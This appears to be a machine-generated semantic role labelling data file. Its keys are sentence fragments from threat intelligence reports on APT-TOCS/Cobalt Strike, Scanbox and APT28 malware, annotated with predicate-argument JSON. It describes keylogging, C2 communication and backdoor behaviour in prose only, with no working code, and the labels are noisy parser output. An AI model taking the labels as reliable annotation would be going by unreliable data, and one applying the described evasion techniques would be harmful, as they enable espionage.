Cookie\n      Title (To identify specific content that the victim is visiting)\n      Domain\n      Charset\n      Screen width and height\n      Operating System\n      Language\n</list>\nResulting in something like this:\nBefore sending the information to the C&C server, Scanbox encodes and encrypts the data with the following function:\nProducing the following request:\nIf we decrypt the data it translates to:\nAfter the first request, the framework contains several plugins to extract different information from the victim": {"is": {"ARG1": {"text": "This Javascript file"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "a framework for reconnaissance that the attackers call \" Scanbox \" and includes some of the techniques we described in a previous blog post : Resulting in something like this : Before sending the information to the C&C server , Scanbox encodes and encrypts the data with the following function"}}, "call": {"ARG0": {"text": "the attackers"}, "V": {"text": "call", "index": 11}, "ARG2": {"text": "\" Scanbox \""}}, "includes": {"ARG2": {"text": "a framework for reconnaissance"}, "R-ARG2": {"text": "that"}, "V": {"text": "includes", "index": 16}, "ARG1": {"text": "some of the techniques we described in a previous blog post : Resulting in something like this : Before sending the information to the C&C server , Scanbox encodes and encrypts the data with the following function"}}, "described": {"ARG1": {"text": "the techniques"}, "ARG0": {"text": "we"}, "V": {"text": "described", "index": 22}, "ARGM-LOC": {"text": "in a previous blog post"}}, "Resulting": {"V": {"text": "Resulting", "index": 29}, "ARG2": {"text": "in something like this"}}, "sending": {"V": {"text": "sending", "index": 36}, "ARG1": {"text": "the information"}, "ARG4": {"text": "to the C&C server"}}, "encrypts": {"ARGM-TMP": {"text": "Before sending the information to the C&C server"}, "V": {"text": "encrypts", "index": 47}, "ARG1": {"text": "the data"}, "ARGM-MNR": {"text": "with the following function"}}, "Producing": {"V": {"text": "Producing", "index": 55}, "ARG1": {"text": "the following request"}}, "following": {"V": {"text": "following", "index": 57}, "ARG1": {"text": "request"}}, "decrypt": {"ARG0": {"text": "we"}, "V": {"text": "decrypt", "index": 62}, "ARG1": {"text": "the data it translates to"}}, "translates": {"ARG1": {"text": "it"}, "V": {"text": "translates", "index": 66}, "ARG2": {"text": "to"}}, "contains": {"ARGM-TMP": {"text": "After the first request"}, "ARG0": {"text": "the framework"}, "V": {"text": "contains", "index": 76}, "ARGM-EXT": {"text": "several plugins"}, "ARG1": {"text": "to extract different information from the victim"}}, "extract": {"V": {"text": "extract", "index": 80}, "ARG1": {"text": "different information"}, "ARG2": {"text": "from the victim"}}}, "\n</list>\nWhile the user is browsing the compromised website, all keystrokes are being recorded and sent to the C&C periodically": {"is": {"V": {"text": "is", "index": 3}}, "browsing": {"ARG0": {"text": "the user"}, "V": {"text": "browsing", "index": 4}, "ARG1": {"text": "the compromised website"}}, "compromised": {"V": {"text": "compromised", "index": 6}, "ARG1": {"text": "website"}}, "are": {"V": {"text": "are", "index": 11}}, "being": {"V": {"text": "being", "index": 12}}, "recorded": {"ARGM-TMP": {"text": "While the user is browsing the compromised website"}, "ARG1": {"text": "all keystrokes"}, "V": {"text": "recorded", "index": 13}}, "sent": {"ARGM-TMP": {"text": "While the user is browsing the compromised website/ periodically"}, "ARG1": {"text": "all keystrokes"}, "V": {"text": "sent", "index": 15}, "ARG2": {"text": "to the C&C"}}}, "\nThe attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server": {"were": {"ARG1": {"text": "The attackers"}, "V": {"text": "were", "index": 2}, "ARG2": {"text": "able to compromise the website and include code that loaded a malicious Javascript file from a remote server"}}, "compromise": {"ARG0": {"text": "The attackers"}, "V": {"text": "compromise", "index": 5}, "ARG1": {"text": "the website"}}, "include": {"ARG2": {"text": "The attackers"}, "V": {"text": "include", "index": 9}, "ARG1": {"text": "code that loaded a malicious Javascript file from a remote server"}}, "loaded": {"R-ARG2": {"text": "that"}, "V": {"text": "loaded", "index": 12}, "ARG1": {"text": "a malicious Javascript file from a remote server"}}}, "                                                               Page 10 </footer>\n\n<header> \f                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, accessing system passwords and so on": {"Using": {"V": {"text": "Using", "index": 7}, "ARG1": {"text": "Cobalt Strike attack"}}, "can": {"V": {"text": "can", "index": 11}}, "execute": {"ARG0": {"text": "Page 10 3.4 Characteristics of Cobalt Strike Using Cobalt Strike attack"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "execute", "index": 12}, "ARG1": {"text": "various operations"}, "ARGM-LOC": {"text": "in the targeted systems"}, "C-ARG1": {"text": "such as downloading and uploading files"}, "ARGM-ADV": {"text": "executing designated programs/ executing commands via PowerShell , importing PowerShell script , executing commands via CMD , accessing system passwords and so on"}, "C-ARG0": {"text": ", injecting keyboard recorder"}}, "targeted": {"V": {"text": "targeted", "index": 17}, "ARG1": {"text": "systems"}}, "downloading": {"V": {"text": "downloading", "index": 22}, "ARG1": {"text": "files"}}, "executing": {"V": {"text": "executing", "index": 27}, "ARG1": {"text": "designated programs"}}, "designated": {"V": {"text": "designated", "index": 28}, "ARG1": {"text": "programs"}}, "injecting": {"V": {"text": "injecting", "index": 31}, "ARG1": {"text": "keyboard recorder"}}, "executing_2": {"V": {"text": "executing", "index": 35}, "ARG1": {"text": "commands/ PowerShell , importing PowerShell script"}, "ARGM-MNR": {"text": "via"}}, "importing": {"V": {"text": "importing", "index": 40}, "ARG1": {"text": "PowerShell script"}}, "executing_3": {"V": {"text": "executing", "index": 44}, "ARG1": {"text": "commands"}, "ARGM-MNR": {"text": "via CMD"}}, "accessing": {"V": {"text": "accessing", "index": 49}, "ARG0": {"text": "system"}, "ARG1": {"text": "passwords"}}}, "\nHere we can see both of them use Cookie to transmit information that has been encrypted, and send requests\nactively every 60 seconds": {"can": {"V": {"text": "can", "index": 2}}, "see": {"ARGM-LOC": {"text": "Here"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "see", "index": 3}, "ARG1": {"text": "both of them use Cookie to transmit information that has been encrypted"}}, "use": {"ARG0": {"text": "both of them"}, "V": {"text": "use", "index": 7}, "ARG1": {"text": "Cookie"}, "ARG2": {"text": "to transmit information that has been encrypted"}}, "transmit": {"ARG0": {"text": "both of them"}, "V": {"text": "transmit", "index": 10}, "ARG1": {"text": "information that has been encrypted"}}, "has": {"V": {"text": "has", "index": 13}}, "been": {"ARG1": {"text": "transmit information"}, "R-ARG1": {"text": "that"}, "V": {"text": "been", "index": 14}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "transmit information"}, "R-ARG1": {"text": "that"}, "V": {"text": "encrypted", "index": 15}}, "send": {"ARGM-LOC": {"text": "Here"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "send", "index": 18}, "ARG1": {"text": "requests"}, "ARGM-MNR": {"text": "actively"}, "ARGM-TMP": {"text": "every 60 seconds"}}}, " This kind of attack pattern disguising as non-malicious real file in the host of its\ntarget, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie\nfield, all these features of this attack pattern are designed to evade the detection of security software and the\ninterception of firewall on the targeted host": {"disguising": {"ARG1": {"text": "attack pattern"}, "V": {"text": "disguising", "index": 5}, "ARG2": {"text": "as non - malicious real file in the host of its target"}}, "sending": {"ARG0": {"text": "it"}, "V": {"text": "sending", "index": 20}, "ARG2": {"text": "a network heartbeat package"}, "ARGM-TMP": {"text": "every 60 seconds"}}, "send": {"ARG0": {"text": "it"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "send", "index": 32}, "ARG1": {"text": "data information"}, "ARGM-MNR": {"text": "via the Cookie field"}}, "are": {"V": {"text": "are", "index": 47}}, "designed": {"ARG1": {"text": "all these features of this attack pattern"}, "V": {"text": "designed", "index": 48}, "ARG3": {"text": "to evade the detection of security software and the interception of firewall on the targeted host"}}, "evade": {"ARG0": {"text": "all these features of this attack"}, "V": {"text": "evade", "index": 50}, "ARG1": {"text": "the detection of security software and the interception of firewall on the targeted host"}}, "targeted": {"V": {"text": "targeted", "index": 63}, "ARG1": {"text": "host"}}}, "\n\nCobalt Strike has the following characteristics:\n\n<list>\n     \uf06c    Penetrating sandbox\n\n     \uf06c    Avoiding whitelist mechanism and cloud detection\n\n     \uf06c    Intranet penetration\n\n     \uf06c    Persistent attacks\n\n     \uf06c    Attacking various platforms\n</list>\n</section>\n\n\n<section>\n<heading> 4 Conclusion </heading>\n\nWith an automated test platform Cobalt Strike, the attack penetration can penetrate firewall, the approach the\nattackers used to control targeted host is covert and undetectable; what\u2019s more, it can attack various platforms, such\n\n\n<footer> \u00a9 Antiy Labs": {"has": {"ARG0": {"text": "Cobalt Strike"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "the following characteristics/ \u00a9 Antiy Labs"}}}, "\n</section>\n\n<section>\n<heading> 2 Analysis on incident sample </heading>\n\n\n2.1 Leading files and sample downloading\n\nAPT-TOCS used \u201cpowershell.exe\u201d to execute Shellcode scripts to realize remote control on targeted system": {"Leading": {"V": {"text": "Leading", "index": 1}, "ARG0": {"text": "files"}}, "downloading": {"V": {"text": "downloading", "index": 5}, "ARG1": {"text": "APT - TOCS"}}, "used": {"ARG0": {"text": "APT - TOCS"}, "V": {"text": "used", "index": 9}, "ARG1": {"text": "\u201c powershell.exe \u201d"}, "ARG2": {"text": "to execute Shellcode scripts to realize remote control on targeted system"}}, "execute": {"V": {"text": "execute", "index": 14}, "ARG1": {"text": "Shellcode scripts"}, "ARGM-PRP": {"text": "to realize remote control on targeted system"}}, "realize": {"V": {"text": "realize", "index": 18}, "ARG1": {"text": "remote control"}, "ARGM-LOC": {"text": "on targeted system"}}, "targeted": {"V": {"text": "targeted", "index": 22}, "ARG1": {"text": "system"}}}, "\n\nJudging from the module strings and the system functions, the module belongs to backdoor program that can send\nGET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds\u2019 interval": {"Judging": {"V": {"text": "Judging", "index": 0}, "ARG3": {"text": "from the module strings and the system functions"}}, "belongs": {"ARGM-ADV": {"text": "Judging from the module strings and the system functions"}, "ARG0": {"text": "the module"}, "V": {"text": "belongs", "index": 12}, "ARG1": {"text": "to backdoor program that can send GET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds \u2019 interval"}}, "can": {"V": {"text": "can", "index": 17}}, "send": {"R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "send", "index": 18}, "ARG1": {"text": "GET request to designated addresses and heartbeat packages"}, "ARGM-MNR": {"text": "by using Cookie fields with 60 seconds \u2019 interval"}}, "GET": {"R-ARG0": {"text": "that"}, "V": {"text": "GET", "index": 19}, "ARG1": {"text": "request to designated addresses and heartbeat packages"}}, "designated": {"V": {"text": "designated", "index": 22}, "ARG1": {"text": "addresses"}, "ARGM-MNR": {"text": "by using Cookie fields with 60 seconds \u2019 interval"}}, "using": {"V": {"text": "using", "index": 28}, "ARG1": {"text": "Cookie fields"}, "ARG2": {"text": "with 60 seconds \u2019 interval"}}}, "\n\nThe reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it\u2019s a kind of\ntargeted attack (one of the features of APT attack), it has anti-detection functions and also it can conceal itself": {"is": {"ARGM-CAU": {"text": "The reason"}, "R-ARGM-CAU": {"text": "why"}, "ARG1": {"text": "the CERT Analysis Team of ANTIY classified APT - TOCS into APT incidents"}, "V": {"text": "is", "index": 16}, "ARG2": {"text": "that it \u2019s a kind of targeted attack ( one of the features of APT attack ) , it has anti - detection functions and also it can conceal itself"}}, "targeted": {"V": {"text": "targeted", "index": 23}, "ARG1": {"text": "attack"}}, "has": {"ARG0": {"text": "it"}, "V": {"text": "has", "index": 36}, "ARG1": {"text": "anti - detection functions"}}, "can": {"V": {"text": "can", "index": 44}}, "conceal": {"ARGM-DIS": {"text": "also"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "conceal", "index": 45}, "ARG1": {"text": "itself"}}}, " The data package is heartbeat": {"is": {"V": {"text": "is", "index": 3}, "ARG2": {"text": "heartbeat"}}}, "\n\nThe core step of APT-TOCS is downloading the script functionalities of Shellcode, which downloads a field of data\ninto memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is\ngenerated by Cobalt Strike (An automatic attack testing platform)": {"is": {"V": {"text": "is", "index": 7}}, "downloading": {"ARG0": {"text": "The core step of APT - TOCS"}, "V": {"text": "downloading", "index": 8}, "ARG1": {"text": "the script functionalities of Shellcode , which downloads a field of data into memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is generated by Cobalt Strike ( An automatic attack testing platform )"}}, "downloads": {"ARG0": {"text": "Shellcode"}, "R-ARG0": {"text": "which"}, "V": {"text": "downloads", "index": 16}, "ARG1": {"text": "a field of data into memory for operation"}, "ARGM-MNR": {"text": "by calling powershell.exe.The decrypted data"}}, "calling": {"V": {"text": "calling", "index": 26}, "ARG1": {"text": "powershell.exe.The decrypted data"}}, "decrypted": {"ARG0": {"text": "powershell.exe.The"}, "V": {"text": "decrypted", "index": 28}, "ARG1": {"text": "data"}}, "is_2": {"ARG1": {"text": "which/ downloads a field of data into memory for operation by calling powershell.exe.The decrypted data"}, "V": {"text": "is", "index": 30}, "ARG2": {"text": "a field of executable Shellcode that is generated by Cobalt Strike ( An automatic attack testing platform )"}}, "is_3": {"V": {"text": "is", "index": 37}}, "generated": {"ARG1": {"text": "executable Shellcode"}, "R-ARG1": {"text": "that"}, "V": {"text": "generated", "index": 38}, "ARG0": {"text": "by Cobalt Strike ("}}}, "                                                                       Page 3 </footer>\n\n\n<header> \f                                Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                                    <figure></figure>    <caption> Figure 5 Content of script 1 </caption>\n\nThe functionality of this part is: decrypting data with base64 encryption and getting module 1, then writing to\nprocess powershell.exe, and executing and operating": {"is": {"ARGM-PRD": {"text": "Page 3"}, "ARG1": {"text": "The functionality of this part"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "decrypting data with base64 encryption and getting module 1 , then writing to process powershell.exe , and executing and operating"}}, "decrypting": {"V": {"text": "decrypting", "index": 9}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "with base64 encryption"}}, "getting": {"V": {"text": "getting", "index": 15}, "ARG1": {"text": "module 1"}}, "writing": {"ARGM-TMP": {"text": "then"}, "V": {"text": "writing", "index": 20}, "ARGM-PRP": {"text": "to process powershell.exe"}}, "process": {"V": {"text": "process", "index": 22}, "ARG1": {"text": "powershell.exe"}}, "executing": {"V": {"text": "executing", "index": 26}}}, " This implant\n             connected to a C2 node that overlapped with prennera[.]com": {"connected": {"ARG1": {"text": "This implant"}, "V": {"text": "connected", "index": 2}, "ARG2": {"text": "to a C2 node that overlapped with prennera[.]com"}}, "overlapped": {"ARG0": {"text": "a C2 node"}, "R-ARG0": {"text": "that"}, "V": {"text": "overlapped", "index": 8}, "ARG1": {"text": "with prennera[.]com"}}}, " The SOURFACE\ndownloader then receives another dropper from its C2 server, and\nthis second dropper installs a second stage backdoor, which is\nusually EVILTOSS": {"receives": {"ARG0": {"text": "The SOURFACE downloader"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "receives", "index": 4}, "ARG1": {"text": "another dropper"}, "ARG2": {"text": "from its C2 server"}}, "installs": {"ARG0": {"text": "this second dropper"}, "V": {"text": "installs", "index": 16}, "ARG1": {"text": "a second stage backdoor , which is usually EVILTOSS"}}, "is": {"ARG1": {"text": "a second stage backdoor"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 23}, "ARGM-TMP": {"text": "usually"}, "ARG2": {"text": "EVILTOSS"}}, "EVILTOSS": {"ARG1": {"text": "a second stage backdoor"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "usually"}, "V": {"text": "EVILTOSS", "index": 25}}}, " They may send spear phishing emails from\na specific IP address or email address": {"may": {"V": {"text": "may", "index": 1}}, "send": {"ARG0": {"text": "They"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "send", "index": 2}, "ARG1": {"text": "spear phishing emails"}, "ARG2": {"text": "from a specific IP address or email address"}}, "phishing": {"V": {"text": "phishing", "index": 4}, "ARG1": {"text": "emails"}, "ARG2": {"text": "from"}}}, " They steal data by configuring their\n       implants to send data out of the network using a victim\n       network\u2019s mail server": {"steal": {"ARG0": {"text": "They"}, "V": {"text": "steal", "index": 1}, "ARG1": {"text": "data"}, "ARG3": {"text": "by configuring their implants to send data out of the network using a victim network \u2019s mail server"}}, "configuring": {"ARG0": {"text": "They"}, "V": {"text": "configuring", "index": 4}, "ARG1": {"text": "their implants to send data out of the network using a victim network \u2019s mail server"}}, "send": {"ARG0": {"text": "They"}, "V": {"text": "send", "index": 8}, "ARG1": {"text": "data"}, "ARG2": {"text": "out of the network"}, "ARGM-MNR": {"text": "using a victim network \u2019s mail server"}}, "using": {"V": {"text": "using", "index": 14}, "ARG1": {"text": "a victim network \u2019s mail server"}}}, " This downloader obtains a\n     second-stage backdoor from a C2 server": {"obtains": {"ARG0": {"text": "This downloader"}, "V": {"text": "obtains", "index": 2}, "ARG1": {"text": "a second - stage backdoor"}, "ARG2": {"text": "from a C2 server"}}}, " They work together         \nto gain access to their targets and steal data": {"work": {"ARG0": {"text": "They"}, "V": {"text": "work", "index": 1}, "ARGM-MNR": {"text": "together"}, "ARG1": {"text": "to gain access to their targets and steal data"}}, "gain": {"ARG0": {"text": "They"}, "V": {"text": "gain", "index": 4}, "ARG1": {"text": "access to their targets"}}, "steal": {"ARG0": {"text": "They"}, "V": {"text": "steal", "index": 10}, "ARG1": {"text": "data"}}}, "    Communications with a C2 server using\n      HTTP": {"using": {"V": {"text": "using", "index": 5}, "ARG1": {"text": "HTTP"}}}, " The backdoor attempted to\nestablish a connection to a Georgian MIA mail\nserver and communicate via MIA email addresses\nending with \u201c@mia.ge.gov\u201d": {"attempted": {"ARG0": {"text": "The backdoor"}, "V": {"text": "attempted", "index": 2}, "ARG1": {"text": "to establish a connection to a Georgian MIA mail server and communicate via MIA email addresses ending with \u201c @mia.ge.gov \u201d"}}, "establish": {"ARG0": {"text": "The backdoor"}, "V": {"text": "establish", "index": 4}, "ARG1": {"text": "a connection to a Georgian MIA mail server"}}, "communicate": {"ARG0": {"text": "The backdoor"}, "V": {"text": "communicate", "index": 14}, "ARGM-MNR": {"text": "via MIA email addresses"}, "ARG2": {"text": "ending with \u201c @mia.ge.gov \u201d"}}, "ending": {"ARG1": {"text": "MIA email addresses"}, "V": {"text": "ending", "index": 19}, "ARGM-MNR": {"text": "with \u201c @mia.ge.gov \u201d"}}}, " User activity is captured once every 500 milliseconds and logged in\nan HTML-like format": {"is": {"V": {"text": "is", "index": 2}}, "captured": {"ARG1": {"text": "User activity"}, "V": {"text": "captured", "index": 3}, "ARGM-TMP": {"text": "once every 500 milliseconds"}}, "logged": {"ARG0": {"text": "User activity"}, "V": {"text": "logged", "index": 9}, "ARG1": {"text": "in an HTML - like format"}}}, " The text of the document\npurports to provide domain and user group setup\n\n<footnote>\n3\n    Georgian Ministry of Internal Affairs website http://police.ge/en/home\n4\n    Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi": {"provide": {"ARG0": {"text": "the document purports"}, "V": {"text": "provide", "index": 7}, "ARG1": {"text": "domain and user group setup 3 Georgian Ministry of Internal Affairs website http://police.ge/en/home"}}, "yielded": {"ARG0": {"text": "The text of the document purports to provide domain and user group setup 3 Georgian Ministry of Internal Affairs website http://police.ge/en/home"}, "V": {"text": "yielded", "index": 26}, "ARG1": {"text": "a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi"}}, "serves": {"ARG0": {"text": "a person of the same name"}, "R-ARG0": {"text": "who"}, "V": {"text": "serves", "index": 38}, "ARG1": {"text": "as a system administrator in Tbilisi"}}}, " Messages are sent using HTTP\nPOST requests whose bodies contain encrypted\nand Base64 encoded data": {"are": {"V": {"text": "are", "index": 1}}, "sent": {"ARG1": {"text": "Messages"}, "V": {"text": "sent", "index": 2}, "ARG2": {"text": "using HTTP POST requests whose bodies contain encrypted and Base64 encoded data"}}, "using": {"V": {"text": "using", "index": 3}, "ARG1": {"text": "HTTP POST requests whose bodies contain encrypted and Base64 encoded data"}}, "contain": {"ARG0": {"text": "whose bodies"}, "V": {"text": "contain", "index": 9}, "ARG1": {"text": "encrypted and Base64 encoded data"}}, "encrypted": {"V": {"text": "encrypted", "index": 10}, "ARG1": {"text": "data"}}, "encoded": {"ARG0": {"text": "Base64"}, "V": {"text": "encoded", "index": 13}, "ARG1": {"text": "data"}}}, "\n 17           \u201c05\u201d                     OS Major version\n\n 19           \u201c01\u201d                     OS Minor version\n 1B           0x0000001a               Header length minus the command byte (LE DWORD)\n 1F           0x00000023               Length of the entire message (LE DWORD)\n</table>\n\n\n\n<footer>32 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\nCommands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST\nrequests": {"are": {"V": {"text": "are", "index": 38}}, "sent": {"ARG1": {"text": "LE DWORD ) Commands"}, "V": {"text": "sent", "index": 39}, "ARG3": {"text": "from the C2 server"}, "ARG4": {"text": "to the CORESHELL backdoor in HTTP responses"}, "ARG2": {"text": "to the POST"}}}, "\n\nAPT28 has registered domains similar to those of                      \nlegitimate Eastern European news sites and                            \ngovernments, listed in Table 2": {"has": {"ARG0": {"text": "APT28"}, "V": {"text": "has", "index": 1}, "ARG1": {"text": "registered domains similar to those of legitimate Eastern European news sites and governments , listed in Table 2"}}, "registered": {"ARG0": {"text": "APT28"}, "V": {"text": "registered", "index": 2}, "ARG1": {"text": "domains"}, "ARG2": {"text": "those of legitimate Eastern European news sites and governments"}, "ARGM-PRD": {"text": "listed in Table 2"}}, "listed": {"ARG1": {"text": "APT28"}, "V": {"text": "listed", "index": 16}, "ARG2": {"text": "in Table 2"}}}, " If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would\nbe written to disk and executed": {"was": {"ARG1": {"text": "the command byte"}, "V": {"text": "was", "index": 4}, "ARG2": {"text": "01 , 02 , or 03"}}, "following": {"V": {"text": "following", "index": 12}, "ARG1": {"text": "bytes"}}, "would": {"ARG1": {"text": "the following bytes"}, "V": {"text": "would", "index": 14}}, "be": {"ARGM-ADV": {"text": "If the command byte was 01 , 02 , or 03"}, "ARG1": {"text": "the following bytes"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "be", "index": 15}, "ARG2": {"text": "a DLL or EXE that would be written to disk and executed"}}, "would_2": {"V": {"text": "would", "index": 21}}, "be_2": {"V": {"text": "be", "index": 22}}, "written": {"ARG1": {"text": "a DLL or EXE"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "written", "index": 23}, "ARG2": {"text": "to disk and executed"}}, "disk": {"ARG1": {"text": "a DLL or EXE"}, "R-ARG1": {"text": "that"}, "V": {"text": "disk", "index": 25}}, "executed": {"ARG1": {"text": "a DLL or EXE"}, "R-ARG1": {"text": "that"}, "V": {"text": "executed", "index": 27}}}, "\n</footnote>\n\n<footer>37 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\nCHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes \u201c+\u201d and \u201c/\u201d for \u201c-\u201d and\n\u201c_\u201d, respectively": {"uses": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "uses", "index": 1}, "ARG1": {"text": "a URL - safe Base64 encoding"}, "ARGM-PRD": {"text": "using an alphabet that substitutes \u201c + \u201d and \u201c / \u201d for \u201c - \u201d and \u201c _ \u201d , respectively"}}, "encoding": {"ARG1": {"text": "URL - safe Base64"}, "V": {"text": "encoding", "index": 7}}, "using": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "an alphabet that substitutes \u201c + \u201d and \u201c / \u201d for \u201c - \u201d and \u201c _ \u201d , respectively"}}, "substitutes": {"ARG0": {"text": "an alphabet"}, "R-ARG0": {"text": "that"}, "V": {"text": "substitutes", "index": 13}, "ARG1": {"text": "\u201c + \u201d and \u201c"}}}, "                          \n                                                        \nSome of APT28\u2019s more commonly used tools are            \nthe SOURFACE downloader, its second stage               \nbackdoor EVILTOSS, and a modular family of              \nimplants that we call CHOPSTICK": {"used": {"ARGM-MNR": {"text": "more commonly"}, "V": {"text": "used", "index": 6}, "ARG1": {"text": "tools"}}, "are": {"ARG1": {"text": "Some of APT28 \u2019s more commonly used tools"}, "V": {"text": "are", "index": 8}, "ARG2": {"text": "the SOURFACE downloader , its second stage backdoor EVILTOSS , and a modular family of implants that we call CHOPSTICK"}}, "call": {"ARG0": {"text": "we"}, "V": {"text": "call", "index": 27}, "ARG1": {"text": "CHOPSTICK"}}}, "\n\u2022    EVILTOSS: This backdoor has been delivered\n     through the SOURFACE downloader to gain\n     system access for reconnaissance,\n     monitoring, credential theft, and shellcode\n     execution": {"has": {"V": {"text": "has", "index": 5}}, "been": {"V": {"text": "been", "index": 6}}, "delivered": {"ARG1": {"text": "This backdoor"}, "V": {"text": "delivered", "index": 7}, "ARGM-DIR": {"text": "through the SOURFACE downloader"}, "ARGM-PRP": {"text": "to gain system access for reconnaissance , monitoring , credential theft , and shellcode execution"}}, "gain": {"V": {"text": "gain", "index": 13}, "ARG1": {"text": "system access for reconnaissance , monitoring , credential theft , and shellcode execution"}}}, " These families             \nencode their strings at compile time using a      \ncustom stream cipher": {"encode": {"ARG0": {"text": "These families"}, "V": {"text": "encode", "index": 2}, "ARG1": {"text": "their strings at compile time"}, "ARG2": {"text": "using a custom stream cipher"}}, "using": {"ARG0": {"text": "These families"}, "V": {"text": "using", "index": 8}, "ARG1": {"text": "a custom stream cipher"}}}, "\n</section>\n\n<footer>29 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX B:\nTIMELINE OF\nAPT28 LURES</heading>\n\n\n\n<table>\n YEAR LURE TOPIC                                                                                            MALWARE\n 2010      Iran\u2019s work with an international organization (internal document)                               SOURFACE\n\n                                                                                                            SOURFACE,\n 2011      File named \u201cmilitary cooperation.doc\u201d\n                                                                                                            OLDBAIT\n\n 2011      Georgian language IT document for Ministry of Internal Affairs (internal document)               SOURFACE\n\n           \u201cUSB Disk Security is the best software to block threats that can damage your PC or compromise\n 2011                                                                                                       SOURFACE\n           your personal information via USB storage.\u201d\n 2012      Food security in Africa (\u201cFood and nutrition crisis reaches peak but good forecast for 2013\u201d)    SOURFACE\n\n 2012      \u201cIDF Soldier Killed and another injured in a Terror Attack\u201d                                      SOURFACE\n\n 2012      \u201cEcho Crisis Report\u201d on Portugal\u2019s forest fires                                                  SOURFACE\n\n 2012      \u201cFBI to monitor Facebook, Twitter, Myspace\u201d                                                      SOURFACE\n\n 2012      Georgia (US state, not the country of Georgia) murder case uncovers terror plot                  SOURFACE\n\n 2012      Military attaches in London (internal document)                                                  SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      South Africa MFA document\n                                                                                                            CORESHELL\n\n 2013      John Shalikashvili (Georgian-Polish-American US General) Questionnaire                           CORESHELL\n\n 2013      Asia Pacific Economic Cooperation Summit 2013 reporters (internal document)                      SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      Defense Attaches in Turkey (internal document)\n                                                                                                            CORESHELL\n                                                                                                            CHOPSTICK,\n 2013      Turkish Cypriot news about Syria chemical weapons\n                                                                                                            CORESHELL\n\n 2013      Georgian language document about drivers\u2019 licenses (internal document)                           EVILTOSS\n\n 2013      Apparent Reason Magazine-related lure sent to a journalist                                       CORESHELL\n\n 2014      Mandarin language document, possibly related to a Chinese aviation group (non-public document)   CORESHELL\n\n 2014      Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack                 CORESHELL\n</table>\n</section>\n\n<footer>30 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX C:\nSOURFACE/CORESHELL</heading>\n\n\n\n\nSOURFACE is a downloader that obtains a second        \nstage backdoor from a C2 server": {"is": {"ARG1": {"text": "SOURFACE"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a downloader that obtains a second stage backdoor from a C2 server"}}, "obtains": {"ARG0": {"text": "a downloader"}, "R-ARG0": {"text": "that"}, "V": {"text": "obtains", "index": 5}, "ARG1": {"text": "a second stage backdoor"}, "ARGM-DIR": {"text": "from a C2 server"}}}, " A SOURFACE sample employed\n      in the same Malaysia Airlines lure was\n      referenced by a Polish computer security\n      company in a blog post.<fn>12</fn> The Polish security\n      company indicated that the sample was \u201csent\n      to the government,\u201d presumably the Polish\n      government, given the company\u2019s location\n      and visibility": {"employed": {"ARG1": {"text": "A SOURFACE sample"}, "V": {"text": "employed", "index": 3}, "ARGM-LOC": {"text": "in the same Malaysia Airlines lure"}}, "was": {"V": {"text": "was", "index": 10}, "ARG2": {"text": "referenced"}}, "referenced": {"ARG1": {"text": "A SOURFACE sample employed in the same Malaysia Airlines lure"}, "V": {"text": "referenced", "index": 11}, "ARG0": {"text": "by a Polish computer security company in a blog post"}}, "indicated": {"ARG0": {"text": "The Polish security company"}, "V": {"text": "indicated", "index": 27}, "ARG1": {"text": "that the sample was \u201c sent to the government , \u201d presumably the Polish government , given the company \u2019s location and visibility"}}, "was_2": {"V": {"text": "was", "index": 31}}, "sent": {"ARG1": {"text": "the sample"}, "V": {"text": "sent", "index": 33}, "ARG2": {"text": "to the government"}, "ARGM-CAU": {"text": "given the company \u2019s location and visibility"}}, "given": {"V": {"text": "given", "index": 44}, "ARG2": {"text": "the company"}, 